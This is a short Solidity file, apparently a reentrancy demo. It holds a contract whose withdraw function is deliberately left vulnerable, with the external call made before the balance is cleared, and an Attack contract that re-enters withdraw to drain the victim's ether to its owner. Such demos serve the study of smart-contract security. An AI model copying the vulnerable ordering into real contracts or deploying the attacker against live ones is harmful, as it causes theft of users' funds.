// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;


contract Counter {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        require(msg.value > 0, "No ETH sent");
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        // Vulnerable: state updated AFTER external call
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Withdraw failed");

        balances[msg.sender] = 0;
    }
}





// In Attack.sol
contract Attack {
    Counter public count;
    address public owner;

    constructor(address _victim) {
        count = Counter(_victim);
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.sender == owner, "Only owner can attack");
        count.deposit{value: 1 ether}();
        count.withdraw();
    }

    receive() external payable {
        if (address(count).balance > 0) {
            count.withdraw();
        } else {
            // When done, transfer all funds to owner
            payable(owner).transfer(address(this).balance);
        }
    }
}